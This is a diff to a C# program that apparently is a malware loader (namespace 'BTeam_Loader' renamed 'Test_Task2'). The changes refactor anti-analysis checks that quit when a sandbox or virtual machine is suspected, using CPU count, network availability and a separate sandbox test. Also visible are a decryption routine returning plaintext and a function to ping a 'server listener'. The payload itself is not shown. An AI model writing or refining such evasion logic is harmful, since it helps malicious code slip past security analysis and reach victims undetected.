@@ -8,19 +8,14 @@ using System.Threading.Tasks;
 using System.Security.Cryptography;
 using System.Net.NetworkInformation;
 
-namespace BTeam_Loader
+namespace Test_Task2
 {
     class Program
     {
         static void Main(string[] args)
         {
-            if (CheckCPUCount() < 2) 
-            {
-                Console.WriteLine("Virtualized/sandbox environment deteced. Exiting...");
-                return;
-            }
-            // Check system info
-            if (IsRunningInSandbox())
+
+            if (IsRunningInSandbox() || CheckCPUCount() < 2 || !IsNetworkAvaiable())
             {
                 Console.WriteLine("It's look like a sandbox or VM. Exiting...");
                 return;
@@ -103,9 +98,15 @@ namespace BTeam_Loader
             }
             return plaintext;
         }
+        // Count CPU - Detect virtualiaze/sandbox
         private static int CheckCPUCount()
         {
             return Environment.ProcessorCount;
+        }
+        // Check network
+        private static bool IsNetworkAvaiable()
+        {
+            return NetworkInterface.GetIsNetworkAvailable();
         }
         private static bool IsRunningInSandbox()
         {
@@ -115,15 +116,9 @@ namespace BTeam_Loader
             {
                 return true;
             }
-
-            // Check network
-            if (!NetworkInterface.GetIsNetworkAvailable())
-            {
-                return true; // Not have connect network
-            }
-
             return false; // Not detect sandbox
         }
+        // Ping server listener
         static bool PingServer(string ipAddress)
         {
             try
